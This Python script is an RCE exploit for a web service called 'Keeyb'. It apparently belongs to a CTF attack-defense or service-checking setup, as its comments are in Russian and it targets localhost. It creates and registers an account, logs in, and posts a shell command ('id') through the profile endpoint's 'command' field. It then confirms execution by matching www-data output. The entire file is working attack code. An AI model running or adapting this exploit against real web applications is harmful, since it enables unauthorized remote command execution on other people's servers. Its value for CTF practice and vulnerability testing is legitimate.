# Sploit (RCE) for Keeyb
# Author: o1d_bu7_go1d

import os
import aiohttp
import asyncio
from colorama import Fore, Style

from keeyb_sploit__helper import create_account, connection_check, register_user


# Функция для проверки возможности создания файла с сертификатом
async def rce_exploit(HOST, PORT, session, cookies):
	url = f'http://{HOST}:{PORT}/?action=profile'

	profile_data = {
		"command": 'id'
	}

	async with session.post(url, data=profile_data, cookies=cookies, allow_redirects=False) as profile_resp:
		if profile_resp.status == 200 or profile_resp.status == 302:
			# Ориентируемся на строку в ответе
			user_text = await profile_resp.text()
			if 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' in user_text:
				print(Fore.GREEN + f"[+] Sploit 1 (Keeyb): {HOST}:{PORT} - command execution was successful" + Style.RESET_ALL)
				return 101, None
			else:
				print(Fore.RED + f"[-] Sploit 1 (Keeyb): {HOST}:{PORT} - failed to execute command, possibly patched" + Style.RESET_ALL)
				return 102, None
		else:
			print(Fore.RED + f"[-] Sploit 1 (Keeyb): {HOST}:{PORT} - failed, unexpected status code: {profile_resp.status}" + Style.RESET_ALL)
			return 102, None


# Функция для авторизации пользователя
async def login_user_and_check(HOST, PORT, account):
	url = f'http://{HOST}:{PORT}/?action=login'
	try:
		async with aiohttp.ClientSession() as session:
			login_data = {
				"username": account[0],
				"password": account[1]
			}
			async with session.post(url, data=login_data, allow_redirects=False) as user_login:
				cookies = user_login.cookies
				if user_login.status == 200 or user_login.status == 302:
					print(Fore.GREEN + f"[+] Sploit 1 (Keeyb): {HOST}:{PORT} - login successful" + Style.RESET_ALL)

					# Вызов основной функции для проверки возможности создания сертификата
					rce = await rce_exploit(HOST, PORT, session, cookies)
					return rce
				else:
					return 102, None
	except:
		print(Fore.RED + f"[-] Sploit 1 (Keeyb): {HOST}:{PORT} - login failed" + Style.RESET_ALL)
		return 102, None


# Агрегирующая функция для остальных
async def sploit_rce(HOST, PORT):
	# 1. Тестовое подключение к сервису
	test_connection = await connection_check(HOST, PORT)

	# 2. Проверяем внутренний статус код из test_connection
	if test_connection[0] == 101:
		# 3. Создаем аккаунт
		account = await create_account()

		# 4. Регистрируем пользователя
		reg_user = await register_user(HOST, PORT, account)

		# 5. Проверяем внутренний статус код из reg_user
		if reg_user[0] == 101:
			# 6. Конечный результат вернется после авторизации и проверки работоспособности
			auth_user = await login_user_and_check(HOST, PORT, account)
			if auth_user[0] == 101:
				return 101, None
			else:
				return 102, None
		else:
			return 102, None
	else:
		return 102, None


# Функция, затрагиваемая чек-системой
async def pwn(HOST, PORT):
	VERDICT = await sploit_rce(HOST, PORT)
	print(VERDICT)
	return VERDICT


loop = asyncio.get_event_loop()
loop.run_until_complete(pwn('localhost', 8000))